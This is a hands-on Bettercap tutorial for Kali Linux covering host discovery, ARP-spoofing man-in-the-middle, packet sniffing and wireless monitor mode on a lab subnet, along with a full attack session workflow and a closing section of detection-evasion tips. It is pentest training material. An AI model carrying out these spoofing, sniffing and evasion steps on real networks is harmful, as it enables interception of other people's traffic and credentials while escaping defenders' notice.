
---
# Bettercap Practical: Network Reconnaissance and MITM on Kali Linux

## Prerequisites
- Kali Linux with Bettercap installed (`sudo apt update && sudo apt install bettercap`)
- Root privileges
- Network adapter supporting monitor mode (e.g., wlan0) **OR** Ethernet interface (eth0 for wired MITM)
- Authorization for target network (this guide assumes authorized pentesting)

## Scenario
Perform network reconnaissance, host discovery, ARP spoofing, and packet sniffing on the `192.168.146.0/24` network using **eth0** (wired interface). For wireless monitor mode, replace `eth0` with your wireless interface (wlan0).

## Step-by-Step Practical

### 1. Initial Network Recon
```bash
┌──(root㉿kali)-[~/Desktop/tool]
└─# ip a
```
**Output Analysis:**
```
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP
    inet 192.168.146.128/24 brd 192.168.146.255 scope global dynamic eth0
```
- **Your IP:** `192.168.146.128`
- **Subnet:** `192.168.146.0/24`
- **Gateway candidates:** `.1` or `.254` (VMware NAT/DHCP)

### 2. Launch Bettercap
```bash
bettercap -iface eth0
```
```
bettercap v2.41.5 (built for linux amd64 with go1.24.9)
192.168.146.0/24 > 192.168.146.128  » [11:36:03] [sys.log] [inf] gateway monitor started ...
```

### 3. Enable Network Probing (Host Discovery)
```bash
net.probe on
```
**What happens:**
- Automatically starts `net.recon` dependency
- Probes all 256 IPs in `192.168.146.0/24` with UDP packets
- Discovers live hosts via mDNS, NetBIOS, UPnP, WSD

**Expected Output:**
```
[11:38:50] [endpoint.new] endpoint 192.168.146.1 detected as 00:50:56:c0:00:08 (VMware, Inc.).
[11:38:52] [endpoint.new] endpoint 192.168.146.254 detected as 00:50:56:f3:5e:0c (VMware, Inc.).
```

### 4. View Discovered Hosts
```bash
net.probe off  # Optional: Stop probing
net.show       # Show all discovered endpoints
```

### 5. ARP Spoofing (MITM Setup)
```bash
# Target specific victim (replace with discovered IP)
set arp.spoof.targets 192.168.146.55
arp.spoof on
```

**ARP Spoof Parameters:**
```
set arp.spoof.fullduplex true    # Spoof both directions
set arp.spoof.internal true      # Don't forward internal traffic
```

**Stop ARP Spoof:**
```bash
arp.spoof off
set arp.spoof.targets ""
```

### 6. Packet Sniffing (Capture Traffic)
```bash
# Enable verbose sniffing
set net.sniff.verbose true
net.sniff on
```

**Sniffing Output Example:**
```
[11:40:12] [pkt.snd] ethernet II, eth.src=00:0c:29:ba:4b:0c, eth.dst=33:33:00:00:00:01, length=86
[11:40:13] [pkt.snd] ip 192.168.146.128 > 8.8.8.8: ICMP echo request, id 1234, seq 1/256
```

**Filter Specific Traffic:**
```bash
set net.sniff.filter port 80 or port 443  # HTTP/HTTPS only
set net.sniff.filter host 192.168.146.55  # Specific target
```

### 7. Monitor Mode (Wireless Alternative)
**For wireless interfaces (wlan0):**
```bash
# Kill conflicting processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates: wlan0mon

# Launch bettercap in monitor mode
bettercap -iface wlan0mon
set wifi.interface wlan0mon
wifi.recon on
```

## Complete Session Workflow
```bash
# 1. Launch
bettercap -iface eth0

# 2. Recon
net.probe on
sleep 10
net.show

# 3. MITM (target gateway or victim)
set arp.spoof.targets 192.168.146.1
set arp.spoof.fullduplex true
arp.spoof on

# 4. Sniff
set net.sniff.verbose true
net.sniff on

# 5. Clean exit
net.sniff off
arp.spoof off
quit
```

## Key Bettercap Commands Reference
| Command | Purpose |
|---------|---------|
| `net.probe on/off` | Host discovery (UDP probes) |
| `net.recon on/off` | Layer 2/3 reconnaissance |
| `net.show` | Display discovered hosts |
| `arp.spoof on/off` | ARP poisoning MITM |
| `net.sniff on/off` | Packet capture |
| `set arp.spoof.targets X.X.X.X` | Set spoofing target |
| `events.stream` | Live events stream |

## Detection Evasion Tips
```bash
# Reduce probe speed
set net.probe.throttle 100

# Disable noisy services
set net.probe.mdns false
set zerogod.service_discovery false
```

